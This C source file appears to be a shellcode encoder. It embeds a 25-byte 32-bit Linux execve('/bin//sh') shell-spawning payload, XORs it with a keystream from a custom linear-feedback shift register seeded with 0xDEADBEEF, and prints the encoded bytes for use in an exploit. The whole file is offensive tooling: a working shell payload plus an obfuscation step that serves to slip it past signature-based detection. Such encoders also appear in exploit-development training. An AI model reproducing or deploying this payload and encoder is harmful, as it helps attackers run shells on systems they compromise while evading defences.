#include<stdint.h>
#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x31\xf6\xb0\x0b\xcd\x80";

uint32_t iv = 0xDEADBEEF;
uint8_t tacts = 0x0f;

uint32_t shift_bits(uint32_t shift_register) 
{
    uint32_t a1 = (shift_register >> 23) & 0x01;
    uint32_t a2 = (shift_register >> 22) & 0x01;
    uint32_t a3 = (shift_register >> 21) & 0x01;
    uint32_t a4 = (shift_register >> 16) & 0x01;
    uint32_t a5 = 0x01;

    uint32_t bit_to_push = (a1 + a2 + a3 + a4 + a5) & 0x01;

    shift_register = shift_register << 1;        
    shift_register = shift_register | bit_to_push;

    return shift_register;    
}

uint8_t get_result_byte(uint32_t shift_register)
{
    uint8_t* a = &shift_register;
    uint8_t result = *a ^ *(a+1) ^ *(a+2) ^ *(a+3);
    
    return result;
} 

void transform(unsigned char* shellcode, uint32_t iv, uint8_t tacts)
{
    uint32_t shift_register = iv;
    uint8_t tacts_count = tacts;

    uint8_t tact = 0;    
    for(tact = 0; tact < tacts_count; tact++)
    {
        shift_register = shift_bits(shift_register);
    }

    int iter = 0;
    for(iter = 0; iter < strlen(shellcode); iter++) 
    {
        uint8_t result = get_result_byte(shift_register);        
        shellcode[iter] = shellcode[iter] ^ result;
        
        shift_register = shift_bits(shift_register);
    }
}

int main()
{
    printf("Shellcode Length: %d\n", strlen(shellcode));
    
    transform(shellcode, iv, tacts);

    int iter = 0;
    for(iter = 0; iter < strlen(shellcode); iter++) 
    {
        printf("\\x%02x", shellcode[iter]);
    }
    printf("\n");
    
    return 0;   
}
